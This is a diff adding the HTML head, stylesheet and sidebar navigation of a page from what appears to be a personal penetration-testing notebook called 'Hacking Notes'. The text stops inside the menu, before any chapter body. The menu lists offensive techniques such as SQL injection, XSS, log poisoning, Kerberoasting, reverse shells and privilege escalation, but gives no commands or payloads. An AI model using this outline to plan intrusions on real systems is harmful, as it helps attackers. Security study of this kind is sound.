@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="" xml:lang="">
+<head>
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Web Vulneratilities | 2021 - Hacking Notes</title>
+  <meta name="description" content="Full Pentest notebook" />
+  <meta name="generator" content="bookdown 0.21 and GitBook 2.6.7" />
+
+  <meta property="og:title" content="Web Vulneratilities | 2021 - Hacking Notes" />
+  <meta property="og:type" content="book" />
+  
+  
+  <meta property="og:description" content="Full Pentest notebook" />
+  <meta name="github-repo" content="https://github.com/mlopez66/hacking-notes" />
+
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Web Vulneratilities | 2021 - Hacking Notes" />
+  
+  <meta name="twitter:description" content="Full Pentest notebook" />
+  
+
+<meta name="author" content="Lo0pInG 404" />
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+  
+  
+<link rel="prev" href="searching-for-exploits.html"/>
+<link rel="next" href="windows-vulnerability.html"/>
+<script src="libs/jquery-2.2.3/jquery.min.js"></script>
+<link href="libs/gitbook-2.6.7/css/style.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-table.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-bookdown.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-highlight.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-search.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-fontsettings.css" rel="stylesheet" />
+<link href="libs/gitbook-2.6.7/css/plugin-clipboard.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+<script src="libs/accessible-code-block-0.0.1/empty-anchor.js"></script>
+
+
+<style type="text/css">
+code.sourceCode > span { display: inline-block; line-height: 1.25; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+</style>
+
+<link rel="stylesheet" href="assets/gitbook.css" type="text/css" />
+</head>
+
+<body>
+
+
+
+  <div class="book without-animation with-summary font-size-2 font-family-1" data-basepath=".">
+
+    <div class="book-summary">
+      <nav role="navigation">
+
+<ul class="summary">
+<li class="header-light">
+  <a class="logo" href="/">
+    <img src="assets/wr404-transparent.png" alt="LoOpInG 404" class="img-fluid">
+  </a>
+  <h1>Lo0pInG 404</h1>
+</li>
+
+<li class="divider"></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html"><i class="fa fa-check"></i>Preface</a><ul>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#introduction-1"><i class="fa fa-check"></i>Introduction</a></li>
+<li class="chapter" data-level="" data-path="index.html"><a href="index.html#acknoledgement-1"><i class="fa fa-check"></i>Acknoledgement</a></li>
+</ul></li>
+<li class="part"><span><b>I Information Gathering</b></span></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html"><i class="fa fa-check"></i>Get Information from public sources</a><ul>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#social-networks"><i class="fa fa-check"></i>Social Networks</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#public-sites"><i class="fa fa-check"></i>Public sites</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#whois"><i class="fa fa-check"></i>Whois</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#check-personnal-victim-website"><i class="fa fa-check"></i>Check personnal victim website</a></li>
+<li class="chapter" data-level="" data-path="get-information-from-public-sources.html"><a href="get-information-from-public-sources.html#passive-enumeration"><i class="fa fa-check"></i>Passive Enumeration</a></li>
+</ul></li>
+<li class="part"><span><b>II Enumeration</b></span></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html"><i class="fa fa-check"></i>Server Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-for-network-connectivity"><i class="fa fa-check"></i>Ping for Network connectivity</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#fping-to-enumerate-multiple-unknown-machines"><i class="fa fa-check"></i>fping to enumerate multiple unknown machines</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#nmap-for-machine-enumeration"><i class="fa fa-check"></i>NMAP for Machine Enumeration</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#port-scanner-with-bash"><i class="fa fa-check"></i>Port scanner with bash</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#use-specific-or-grouped-nmap-script-for-enumeration"><i class="fa fa-check"></i>Use specific or grouped nmap script for Enumeration</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#search-for-port-with-udp-protocol"><i class="fa fa-check"></i>Search for port with udp protocol</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#get-snmp-community-string-with-onesixtyone"><i class="fa fa-check"></i>Get snmp community string with onesixtyone</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processes-with-snmpwalk"><i class="fa fa-check"></i>Enumerate internal services and processes with snmpwalk</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-internal-services-and-processed-with-nmap-scripts"><i class="fa fa-check"></i>Enumerate internal services and processed with nmap scripts</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ipv6-enumeration"><i class="fa fa-check"></i>IPV6 enumeration</a><ul>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#ping-a-machine-with-its-ipv6-address"><i class="fa fa-check"></i>Ping a machine with it’s ipv6 address</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#enumerate-ports-with-nmap-with-the-ipv6-address"><i class="fa fa-check"></i>Enumerate ports with nmap with the ipv6 address</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#display-ipv6-web-app-on-the-web-browser"><i class="fa fa-check"></i>Display ipv6 web app on the web browser</a></li>
+<li class="chapter" data-level="" data-path="server-enumeration.html"><a href="server-enumeration.html#pass-from-mac-address-to-ipv6-link-local-address"><i class="fa fa-check"></i>Pass from MAC address to IPV6 link local address</a></li>
+</ul></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html"><i class="fa fa-check"></i>Web Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#check-if-web-app-is-under-a-waf"><i class="fa fa-check"></i>Check if web app is under a WAF</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#nmap-http-scripting"><i class="fa fa-check"></i>Nmap http scripting</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#whatweb"><i class="fa fa-check"></i>Whatweb</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#create-a-dictionary-with-the-elements-in-a-website"><i class="fa fa-check"></i>Create a dictionary with the elements in a website</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-wfuzz"><i class="fa fa-check"></i>Fuzzing with WFUZZ</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirbuster"><i class="fa fa-check"></i>Fuzzing with Dirbuster</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#fuzzing-with-dirb"><i class="fa fa-check"></i>Fuzzing with Dirb</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#wpscan-for-wordpress-webapps"><i class="fa fa-check"></i>WPScan for wordpress webapps</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#inspect-ssl-certificate"><i class="fa fa-check"></i>Inspect SSL certificate</a></li>
+<li class="chapter" data-level="" data-path="web-enumeration.html"><a href="web-enumeration.html#use-curl-to-retrieve-user-or-information-in-the-webapp"><i class="fa fa-check"></i>Use curl to retrieve user or information in the webapp</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html"><i class="fa fa-check"></i>Steganography</a><ul>
+<li class="chapter" data-level="" data-path="steganography.html"><a href="steganography.html#look-at-info-with-file"><i class="fa fa-check"></i>Look at info with file</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html"><i class="fa fa-check"></i>Active Directory &amp; Windows Machines</a><ul>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#interesting-windows-ports"><i class="fa fa-check"></i>Interesting Windows ports</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#map-samba-exposed-shared-resources-with-smbmap"><i class="fa fa-check"></i>Map SAMBA exposed shared resources with smbmap</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#smb-connection-with-smbclient-and-smbmap"><i class="fa fa-check"></i>SMB connection with smbclient and smbmap</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-machines-and-check-user-validity-by-samba-with-cme"><i class="fa fa-check"></i>Enumerate machines and check user validity by SAMBA with CME</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#sniffing-traffic-for-samba-relay-with-responder"><i class="fa fa-check"></i>Sniffing traffic for SAMBA Relay with responder</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#rpc-connection-with-rpcclient"><i class="fa fa-check"></i>RPC connection with rpcclient</a></li>
+<li class="chapter" data-level="" data-path="active-directory-windows-machines.html"><a href="active-directory-windows-machines.html#enumerate-ldap-service-with-nmap"><i class="fa fa-check"></i>Enumerate ldap service with nmap</a></li>
+</ul></li>
+<li class="part"><span><b>III Vulnerabilies Assessment</b></span></li>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html"><i class="fa fa-check"></i>Searching for exploits</a><ul>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#exploit-database"><i class="fa fa-check"></i>Exploit database</a></li>
+<li class="chapter" data-level="" data-path="searching-for-exploits.html"><a href="searching-for-exploits.html#searchsploit"><i class="fa fa-check"></i>Searchsploit</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html"><i class="fa fa-check"></i>Web Vulneratilities</a><ul>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#lfi-local-file-inclusion"><i class="fa fa-check"></i>LFI (Local File inclusion)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#wrappers"><i class="fa fa-check"></i>Wrappers</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#log-poisoning"><i class="fa fa-check"></i>Log Poisoning</a><ul>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#apache2"><i class="fa fa-check"></i>Apache2</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssh-logs"><i class="fa fa-check"></i>ssh logs</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#rfi-remote-file-inclusion"><i class="fa fa-check"></i>RFI (Remote File inclusion)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#html-injection"><i class="fa fa-check"></i>HTML Injection</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-cross-site-scripting"><i class="fa fa-check"></i>XSS (Cross site scripting)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xss-blind"><i class="fa fa-check"></i>XSS Blind</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#csrf-cross-site-request-forgery"><i class="fa fa-check"></i>CSRF (Cross-site Request Forgery)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssrf-server-side-request-forgery"><i class="fa fa-check"></i>SSRF (Server-Side Request Forgery)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---error-based"><i class="fa fa-check"></i>SQL Injection - Error Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---time-based"><i class="fa fa-check"></i>SQL Injection - Time Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sql-injection---boolean-based"><i class="fa fa-check"></i>SQL Injection - Boolean Based</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#sqlmap"><i class="fa fa-check"></i>SQLMap</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-padbuster"><i class="fa fa-check"></i>Padding Oracle Attack (Padbuster)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#padding-oracle-attack-bit-flipper-attack---burpsuite"><i class="fa fa-check"></i>Padding Oracle Attack (Bit Flipper Attack - BurpSuite)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#shellshock"><i class="fa fa-check"></i>ShellShock</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#xxe-xml-external-entity-injection"><i class="fa fa-check"></i>XXE (XML External Entity Injection)</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#blind-xxe"><i class="fa fa-check"></i>Blind XXE</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#domain-zone-transfer"><i class="fa fa-check"></i>Domain Zone Transfer</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#insecure-deserialization"><i class="fa fa-check"></i>Insecure Deserialization</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#type-juggling"><i class="fa fa-check"></i>Type Juggling</a></li>
+<li class="chapter" data-level="" data-path="web-vulneratilities.html"><a href="web-vulneratilities.html#ssti"><i class="fa fa-check"></i>SSTI</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html"><i class="fa fa-check"></i>Windows vulnerability</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#use-scf-file-to-get-the-ntlmv2-hash"><i class="fa fa-check"></i>Use scf file to get the NTLMv2 hash</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#active-directory-enumeration"><i class="fa fa-check"></i>Active Directory Enumeration</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-attacker-machine"><i class="fa fa-check"></i>Injesting bloodhound from the attacker machine</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#injesting-bloodhound-from-the-victim"><i class="fa fa-check"></i>Injesting bloodhound from the victim</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#install-bloodhound-and-run-it"><i class="fa fa-check"></i>Install bloodhound and run it</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#asreproasing-on-kerberos"><i class="fa fa-check"></i>ASREPRoasing on Kerberos</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack"><i class="fa fa-check"></i>Kerberoasting attack</a><ul>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-on-victim-machine-with-rubeus"><i class="fa fa-check"></i>Kerberoasting attack on victim machine with rubeus</a></li>
+<li class="chapter" data-level="" data-path="windows-vulnerability.html"><a href="windows-vulnerability.html#kerberoasting-attack-from-attacker-machine-with-impacket-getuserspns"><i class="fa fa-check"></i>Kerberoasting attack from attacker machine with impacket-GetUserSPNs</a></li>
+</ul></li>
+</ul></li>
+<li class="part"><span><b>IV Vuln exploit &amp; Gaining Access</b></span></li>
+<li class="chapter" data-level="" data-path="beyond-remote-code-execution.html"><a href="beyond-remote-code-execution.html"><i class="fa fa-check"></i>Beyond Remote Code Execution</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html"><i class="fa fa-check"></i>Checking if code execution occurs</a><ul>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#time-sleep-technic"><i class="fa fa-check"></i>Time sleep technic</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#check-network-connectivity"><i class="fa fa-check"></i>Check network connectivity</a></li>
+<li class="chapter" data-level="" data-path="checking-if-code-execution-occurs.html"><a href="checking-if-code-execution-occurs.html#use-wget-and-netcat-to-execute-command"><i class="fa fa-check"></i>Use wget and netcat to execute command</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="visible-remote-code-execution.html"><a href="visible-remote-code-execution.html"><i class="fa fa-check"></i>Visible remote code execution</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html"><i class="fa fa-check"></i>Gaining access throw remote code execution</a><ul>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#listen-and-connection-with-netcat"><i class="fa fa-check"></i>Listen and connection with netcat</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#connection-with-curl"><i class="fa fa-check"></i>Connection with curl</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-throw-remote-code-execution.html"><a href="gaining-access-throw-remote-code-execution.html#spawning-a-terminal-from-a-shell"><i class="fa fa-check"></i>Spawning a terminal from a shell</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html"><i class="fa fa-check"></i>Use SQL Injection for create a reverse shell</a><ul>
+<li class="chapter" data-level="" data-path="use-sql-injection-for-create-a-reverse-shell.html"><a href="use-sql-injection-for-create-a-reverse-shell.html#postgresql"><i class="fa fa-check"></i>Postgresql</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html"><i class="fa fa-check"></i>Password Cracking</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#password-cracking-with-johntheripper"><i class="fa fa-check"></i>Password Cracking with JohnTheRipper</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-brute-force"><i class="fa fa-check"></i>Use John for brute force</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-john-for-dictionary-attack"><i class="fa fa-check"></i>Use John for dictionary attack</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ssh-keys-protected-by-password"><i class="fa fa-check"></i>Cracking ssh keys protected by password</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#cracking-ftp-protected-by-password"><i class="fa fa-check"></i>Cracking ftp protected by password</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#use-websites-for-cracking-password"><i class="fa fa-check"></i>Use websites for cracking password</a></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking"><i class="fa fa-check"></i>Authentication Cracking</a><ul>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#authentication-cracking-with-hydra"><i class="fa fa-check"></i>Authentication Cracking with Hydra</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="password-cracking.html"><a href="password-cracking.html#break-known-hash-algorithms-with-cyberchef"><i class="fa fa-check"></i>Break known hash algorithms with CyberChef</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html"><i class="fa fa-check"></i>Pivoting</a><ul>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-chisel"><i class="fa fa-check"></i>Pivoting with chisel</a></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#pivoting-with-socat"><i class="fa fa-check"></i>Pivoting with socat</a></li>
+<li class="chapter" data-level="" data-path="pivoting.html"><a href="pivoting.html#port-forwarding-with-ssh"><i class="fa fa-check"></i>Port forwarding with ssh</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html"><i class="fa fa-check"></i>Gaining access with Metasploit</a><ul>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#search-for-a-proper-exploit"><i class="fa fa-check"></i>Search for a proper exploit</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#use-the-desired-exploit"><i class="fa fa-check"></i>Use the desired exploit</a></li>
+<li class="chapter" data-level="" data-path="gaining-access-with-metasploit.html"><a href="gaining-access-with-metasploit.html#run-the-exploit"><i class="fa fa-check"></i>Run the exploit</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html"><i class="fa fa-check"></i>Windows Specific</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#ms-sql-server"><i class="fa fa-check"></i>MS SQL Server</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connect-to-machine-with-psexec"><i class="fa fa-check"></i>Connect to machine with PSEXEC</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#send-files-to-windows-machine"><i class="fa fa-check"></i>Send files to windows machine</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-with-certutil"><i class="fa fa-check"></i>Download files with certutil</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#download-files-by-using-powershell"><i class="fa fa-check"></i>Download files by using Powershell</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#share-smb-directory-with-windows-machine"><i class="fa fa-check"></i>Share SMB directory with Windows Machine</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#connection-throw-winrm-with-evil-winrm"><i class="fa fa-check"></i>Connection throw WinRM with evil-winrm</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#exploit-getchangesall-privilege-vulnerability"><i class="fa fa-check"></i>Exploit GetChangesAll privilege vulnerability</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#powershell-access-with-nishang"><i class="fa fa-check"></i>Powershell access with Nishang</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#invoke-powershelltcp.ps1"><i class="fa fa-check"></i>Invoke-PowerShelltcp.ps1</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#create-a-reverse-shell-with-msfvenom"><i class="fa fa-check"></i>Create a reverse shell with msfvenom</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#bypass-constraint-language-in-a-powershell"><i class="fa fa-check"></i>Bypass Constraint Language in a PowerShell</a></li>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#shells-for-windows"><i class="fa fa-check"></i>Shells for windows</a><ul>
+<li class="chapter" data-level="" data-path="windows-specific.html"><a href="windows-specific.html#php"><i class="fa fa-check"></i>PHP</a></li>
+</ul></li>
+</ul></li>
+<li class="part"><span><b>V Privilege Escalation</b></span></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html"><i class="fa fa-check"></i>Linux Machine</a><ul>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#writable-rights-in-etcpasswd"><i class="fa fa-check"></i>Writable rights in /etc/passwd</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#local-port-forwarding"><i class="fa fa-check"></i>Local Port forwarding</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#add-ssuid-privilege-to-tool"><i class="fa fa-check"></i>Add SSUID privilege to tool</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#path-hijacking"><i class="fa fa-check"></i>Path Hijacking</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#library-hijacking"><i class="fa fa-check"></i>Library Hijacking</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#wildcards"><i class="fa fa-check"></i>WildCards</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#linux-capabilities-exploitation"><i class="fa fa-check"></i>Linux capabilities exploitation</a></li>
+<li class="chapter" data-level="" data-path="linux-machine.html"><a href="linux-machine.html#kernel-abuse"><i class="fa fa-check"></i>Kernel abuse</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html"><i class="fa fa-check"></i>Windows Machine</a><ul>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#active-directory"><i class="fa fa-check"></i>Active Directory</a><ul>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#golden-ticket-attack"><i class="fa fa-check"></i>Golden Ticket Attack</a></li>
+</ul></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-possible-privilege-escalation-vulnerabilities"><i class="fa fa-check"></i>Check possible privilege escalation vulnerabilities</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-command-history"><i class="fa fa-check"></i>Check command history</a></li>
